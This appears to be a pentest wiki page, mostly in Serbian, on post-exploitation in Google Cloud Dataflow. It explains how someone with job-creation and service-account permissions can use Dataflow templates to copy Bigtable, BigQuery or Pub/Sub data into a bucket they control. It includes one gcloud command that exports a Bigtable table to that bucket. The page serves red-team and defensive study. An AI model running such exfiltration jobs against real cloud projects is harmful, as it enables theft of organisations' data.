# GCP - Dataflow Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

Za više informacija o Dataflow pogledajte:

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### Using Dataflow to exfiltrate data from other services

**Dozvole:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs` (nad SA sa pristupom izvoru i odredištu)

Sa pravima za kreiranje Dataflow poslova, možete koristiti GCP Dataflow templates da izvezete podatke iz Bigtable, BigQuery, Pub/Sub i drugih servisa u GCS buckets pod kontrolom napadača. Ovo je moćna post-exploitation tehnika kada imate pristup Dataflow-u — na primer putem [Dataflow Rider](../gcp-privilege-escalation/gcp-dataflow-privesc.md) privilege escalation (preuzimanje pipeline-a putem upisa u bucket).

> [!NOTE]
> Potrebno je `iam.serviceAccounts.actAs` nad service account-om koji ima dovoljne dozvole da čita izvor i piše u odredište. Po defaultu, Compute Engine default SA se koristi ako nije navedeno.

#### Bigtable u GCS

Pogledajte [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md#dump-rows-to-your-bucket) — "Dump rows to your bucket" za kompletan obrazac. Templates: `Cloud_Bigtable_to_GCS_Json`, `Cloud_Bigtable_to_GCS_Parquet`, `Cloud_Bigtable_to_GCS_SequenceFile`.

<details>

<summary>Export Bigtable to attacker-controlled bucket</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<YOUR_BUCKET>/raw-json/ \
--staging-location=gs://<YOUR_BUCKET>/staging/
```
</details>

#### BigQuery to GCS

Postoje Dataflow templates za izvoz podataka iz BigQuery. Koristite odgovarajući template za ciljani format (JSON, Avro, itd.) i usmerite izlaz u vaš bucket.

#### Pub/Sub and streaming sources

Streaming pipelines mogu čitati iz Pub/Sub (ili drugih izvora) i pisati u GCS. Pokrenite job koristeći template koji čita iz ciljne Pub/Sub subscription i upisuje u bucket pod vašom kontrolom.

## References

- [Dataflow templates](https://cloud.google.com/dataflow/docs/guides/templates/provided-templates)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md)

{{#include ../../../banners/hacktricks-training.md}}
